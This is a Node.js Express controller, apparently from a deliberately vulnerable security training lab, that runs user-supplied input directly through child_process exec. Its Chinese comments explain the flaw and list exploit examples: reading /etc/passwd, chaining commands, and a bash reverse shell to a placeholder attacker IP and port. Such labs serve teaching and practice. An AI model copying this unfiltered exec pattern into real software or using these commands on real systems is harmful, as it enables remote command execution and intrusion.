const { exec } = require('child_process');

// 渲染命令执行Level 1页面
exports.renderPage = (req, res) => {
  res.render('command/level1', {
    title: '命令执行 - Level 1',
    activeMenu: 'command',
    result: null,
    command: ''
  });
};

// 处理命令执行Level 1查询
exports.processCommand = (req, res) => {
  const { command } = req.body;
  let result = null;
  
  // 不安全的命令执行 - 直接执行用户输入
  // 漏洞类型: 命令执行
  // 漏洞原理: 直接将用户输入传递给exec函数执行，没有任何过滤
  // 题解: 可以直接输入系统命令如 whoami, ls -la, cat /etc/passwd 等
  // 绕过方法: 不需要绕过，直接输入即可
  // 利用示例:
  // 1. whoami - 查看当前用户
  // 2. ls -la - 列出当前目录文件
  // 3. cat /etc/passwd - 查看密码文件
  // 4. 命令连接执行: ls -la;pwd 或 ls -la && pwd
  // 5. 反向shell: bash -c 'bash -i >& /dev/tcp/攻击者IP/端口 0>&1'
  if (command) {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        result = `执行错误: ${error.message}`;
      } else if (stderr) {
        result = `stderr: ${stderr}`;
      } else {
        result = stdout;
      }
      
      res.render('command/level1', {
        title: '命令执行 - Level 1',
        activeMenu: 'command',
        result,
        command
      });
    });
  } else {
    res.render('command/level1', {
      title: '命令执行 - Level 1',
      activeMenu: 'command',
      result: '请输入命令',
      command: ''
    });
  }
}; 